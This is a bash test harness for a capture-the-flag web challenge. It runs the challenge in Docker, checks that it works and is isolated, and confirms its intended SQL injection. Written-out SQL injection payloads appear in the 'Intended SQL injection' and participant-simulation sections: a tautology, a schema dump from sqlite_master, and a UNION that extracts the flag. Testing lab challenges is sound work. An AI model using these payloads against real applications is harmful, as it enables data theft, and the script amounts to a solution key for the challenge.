#!/usr/bin/env bash
# Local Docker verification for WEB-04 — Database After Dark.
# Usage: ./tests/run-local-docker-tests.sh [image-tag]
set -euo pipefail

IMAGE="${1:-web-04-database-after-dark:test}"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TEAM_A='AXUM{team_a_test_flag}'
TEAM_B='AXUM{team_b_test_flag}'
NAME_A="web04-test-a-$$"
NAME_B="web04-test-b-$$"
WORK="$(mktemp -d)"
FAILURES=0

# UNION payload: matches the four-column projection of the search endpoint.
PAYLOAD="' UNION SELECT id, record_name, classification, flag FROM internal_records-- -"

pass() { printf '  \033[32mPASS\033[0m %s\n' "$1"; }
fail() { printf '  \033[31mFAIL\033[0m %s\n' "$1"; FAILURES=$((FAILURES + 1)); }
info() { printf '\n\033[1m%s\033[0m\n' "$1"; }

cleanup() {
  docker rm -f "$NAME_A" "$NAME_B" >/dev/null 2>&1 || true
  rm -rf "$WORK"
}
trap cleanup EXIT

json() { python3 -c "import json,sys;print(json.load(sys.stdin)$1)"; }

flag_from() {
  python3 -c '
import json, sys
rows = json.load(sys.stdin)
for row in rows if isinstance(rows, list) else []:
    value = str(row.get("description", ""))
    if value.startswith("AXUM{") and value.endswith("}"):
        print(value)
        break
'
}

host_port() { docker port "$1" 3000/tcp | head -n1 | sed 's/.*://'; }

wait_ready() {
  local port=$1
  for _ in $(seq 1 40); do
    if curl -fsS "http://127.0.0.1:${port}/health" >/dev/null 2>&1; then return 0; fi
    sleep 0.5
  done
  return 1
}

info "Building $IMAGE"
docker build -q -t "$IMAGE" "$ROOT/source" >/dev/null
pass "image builds"

info "Starting one container per simulated team"
docker run -d --name "$NAME_A" -e "GZCTF_FLAG=$TEAM_A" -p 127.0.0.1::3000 "$IMAGE" >/dev/null
docker run -d --name "$NAME_B" -e "GZCTF_FLAG=$TEAM_B" -p 127.0.0.1::3000 "$IMAGE" >/dev/null
PORT_A=$(host_port "$NAME_A")
PORT_B=$(host_port "$NAME_B")
wait_ready "$PORT_A" || fail "instance A did not become ready"
wait_ready "$PORT_B" || fail "instance B did not become ready"
pass "both instances listen on mapped ports ($PORT_A, $PORT_B)"

info "Functional tests"
CODE=$(curl -s -o "$WORK/index.html" -w '%{http_code}' "http://127.0.0.1:${PORT_A}/")
[ "$CODE" = "200" ] && pass "catalogue page loads (200)" || fail "catalogue returned $CODE"
grep -q 'Blackstone Commerce' "$WORK/index.html" && pass "catalogue page is branded" || fail "catalogue branding missing"

CODE=$(curl -s -o "$WORK/assets.css" -w '%{http_code}' "http://127.0.0.1:${PORT_A}/css/style.css")
[ "$CODE" = "200" ] && pass "stylesheet served (200)" || fail "stylesheet returned $CODE"

CODE=$(curl -s -o "$WORK/assets.js" -w '%{http_code}' "http://127.0.0.1:${PORT_A}/js/app.js")
[ "$CODE" = "200" ] && pass "client bundle served (200)" || fail "client bundle returned $CODE"

curl -s "http://127.0.0.1:${PORT_A}/health" >"$WORK/health.json"
[ "$(json "['status']" <"$WORK/health.json")" = "ok" ] \
  && pass "health endpoint reports ok" || fail "health endpoint payload unexpected"

CODE=$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:${PORT_A}/healthz")
[ "$CODE" = "200" ] && pass "healthz endpoint reachable (200)" || fail "healthz returned $CODE"

curl -s "http://127.0.0.1:${PORT_A}/api/products" >"$WORK/products.json"
[ "$(json ".__len__()" <"$WORK/products.json")" = "12" ] \
  && pass "catalogue exposes 12 products" || fail "unexpected product count"

curl -s "http://127.0.0.1:${PORT_A}/api/categories" >"$WORK/categories.json"
[ "$(json ".__len__()" <"$WORK/categories.json")" = "4" ] \
  && pass "catalogue exposes 4 categories" || fail "unexpected category count"

curl -sG --data-urlencode "q=printer" "http://127.0.0.1:${PORT_A}/api/products/search" >"$WORK/q.json"
COUNT=$(json ".__len__()" <"$WORK/q.json")
[ "$COUNT" -ge 1 ] && pass "keyword search returns matches ($COUNT)" || fail "keyword search returned nothing"

curl -sG --data-urlencode "category=Industrial Hardware" \
  "http://127.0.0.1:${PORT_A}/api/products/search" >"$WORK/cat.json"
[ "$(json ".__len__()" <"$WORK/cat.json")" = "3" ] \
  && pass "category filter returns the expected rows" || fail "category filter returned unexpected rows"

info "Intended SQL injection"
CODE=$(curl -s -o "$WORK/quote.json" -w '%{http_code}' -G \
  --data-urlencode "category='" "http://127.0.0.1:${PORT_A}/api/products/search")
[ "$CODE" = "400" ] && pass "unterminated quote is rejected (400)" || fail "quote payload returned $CODE"

if grep -qiE 'sqlite|syntax error|select|internal_records' "$WORK/quote.json"; then
  fail "error response leaks database details"
else
  pass "error response leaks no SQL or schema details"
fi

curl -sG --data-urlencode "category=' OR 1=1-- -" \
  "http://127.0.0.1:${PORT_A}/api/products/search" >"$WORK/tautology.json"
[ "$(json ".__len__()" <"$WORK/tautology.json")" = "12" ] \
  && pass "tautology returns the full table (injection confirmed)" || fail "tautology payload failed"

curl -sG --data-urlencode "category=' UNION SELECT 1,sql,3,4 FROM sqlite_master-- -" \
  "http://127.0.0.1:${PORT_A}/api/products/search" >"$WORK/schema.json"
grep -q 'internal_records' "$WORK/schema.json" \
  && pass "schema is enumerable through the injection" || fail "schema enumeration failed"

curl -sG --data-urlencode "category=$PAYLOAD" \
  "http://127.0.0.1:${PORT_A}/api/products/search" >"$WORK/flag_a.json"
FLAG_A=$(flag_from <"$WORK/flag_a.json")
[ "$FLAG_A" = "$TEAM_A" ] \
  && pass "UNION returns instance A's runtime flag" || fail "UNION returned '${FLAG_A:-nothing}' instead of instance A's flag"

info "Dynamic flag isolation"
curl -sG --data-urlencode "category=$PAYLOAD" \
  "http://127.0.0.1:${PORT_B}/api/products/search" >"$WORK/flag_b.json"
FLAG_B=$(flag_from <"$WORK/flag_b.json")
[ "$FLAG_B" = "$TEAM_B" ] \
  && pass "UNION returns instance B's own flag" || fail "instance B flag mismatch"

if grep -qF "$TEAM_B" "$WORK/flag_a.json"; then
  fail "instance A returns instance B's flag"
else
  pass "instance A never returns instance B's flag"
fi

if grep -qF "$TEAM_A" "$WORK/flag_b.json"; then
  fail "instance B returns instance A's flag"
else
  pass "instance B never returns instance A's flag"
fi

info "Flag leakage checks"
LEAK=0
for path in / /css/style.css /js/app.js /health /healthz /api/products /api/categories "/api/products/search?q=printer"; do
  if curl -s "http://127.0.0.1:${PORT_A}${path}" | grep -q 'AXUM{'; then
    fail "flag-like content served at ${path}"
    LEAK=1
  fi
done
[ "$LEAK" = "0" ] && pass "no flag in pages, assets, health or catalogue APIs"

for name in "$NAME_A" "$NAME_B"; do
  if docker logs "$name" 2>&1 | grep -q 'AXUM{'; then
    fail "container $name logs the flag"
  fi
done
pass "container logs contain no flag"

if docker run --rm --entrypoint sh "$IMAGE" -c \
  'grep -rIl "AXUM{" /app/src /app/public /app/entrypoint.sh /app/package.json 2>/dev/null' \
  >/dev/null 2>&1; then
  fail "image contains flag-like content"
else
  pass "image contains no flag"
fi

if docker run --rm --entrypoint sh "$IMAGE" -c 'ls -A /app/data 2>/dev/null' | grep -q .; then
  fail "image ships a pre-built database"
else
  pass "image ships no database"
fi

if docker image inspect "$IMAGE" --format '{{json .Config.ExposedPorts}}' | grep -q '3000'; then
  fail "image declares EXPOSE, which reserves ports per dynamic instance"
else
  pass "image declares no EXPOSE"
fi

info "Container security posture"
INSPECT=$(docker inspect "$NAME_A")
echo "$INSPECT" | python3 -c '
import json,sys
c=json.load(sys.stdin)[0]
assert c["HostConfig"]["Privileged"] is False, "privileged"
assert c["Mounts"] == [], "mounts present"
assert c["Config"]["User"] == "node", "unexpected user"
' && pass "not privileged, no mounts, runs as node" || fail "container security posture is wrong"

IDENTITY=$(docker run --rm --entrypoint id "$IMAGE")
case "$IDENTITY" in
  *"uid=1000(node)"*) pass "runtime user is non-root ($IDENTITY)" ;;
  *) fail "unexpected runtime user: $IDENTITY" ;;
esac

SOCKET=$(echo "$INSPECT" | python3 -c '
import json,sys
c=json.load(sys.stdin)[0]
print(any("docker.sock" in (m.get("Source","")+m.get("Destination","")) for m in c["Mounts"]))
')
[ "$SOCKET" = "False" ] && pass "Docker socket is not mounted" || fail "Docker socket is mounted"

info "Fail-closed behaviour"
if docker run --rm "$IMAGE" >"$WORK/noflag.log" 2>&1; then
  fail "container started without GZCTF_FLAG"
else
  pass "container refuses to start without GZCTF_FLAG"
fi
grep -q 'GZCTF_FLAG is missing or empty' "$WORK/noflag.log" \
  && pass "missing-flag error is explicit" || fail "missing-flag error is unclear"

if docker run --rm -e 'GZCTF_FLAG=   ' "$IMAGE" >"$WORK/blankflag.log" 2>&1; then
  fail "container started with a blank GZCTF_FLAG"
else
  pass "container refuses to start with a blank GZCTF_FLAG"
fi

info "Health"
for _ in $(seq 1 60); do
  [ "$(docker inspect --format '{{.State.Health.Status}}' "$NAME_B")" = "healthy" ] && break
  sleep 1
done
[ "$(docker inspect --format '{{.State.Health.Status}}' "$NAME_B")" = "healthy" ] \
  && pass "container healthcheck reports healthy" || fail "container healthcheck is not healthy"

info "Participant simulation (documented path only)"
curl -s "http://127.0.0.1:${PORT_B}/" >"$WORK/sim-index.html"
grep -q 'api/products/search' "$WORK/sim-index.html" "$WORK/assets.js" \
  && pass "catalogue UI references the search endpoint" || fail "search endpoint not referenced by the UI"
curl -sG --data-urlencode "category=$PAYLOAD" \
  "http://127.0.0.1:${PORT_B}/api/products/search" >"$WORK/sim-flag.json"
[ "$(flag_from <"$WORK/sim-flag.json")" = "$TEAM_B" ] \
  && pass "flag reachable by injecting the documented category parameter" \
  || fail "participant simulation could not retrieve the flag"

echo
if [ "$FAILURES" -eq 0 ]; then
  printf '\033[32mAll WEB-04 Docker checks passed.\033[0m\n'
else
  printf '\033[31m%d check(s) failed.\033[0m\n' "$FAILURES"
  exit 1
fi
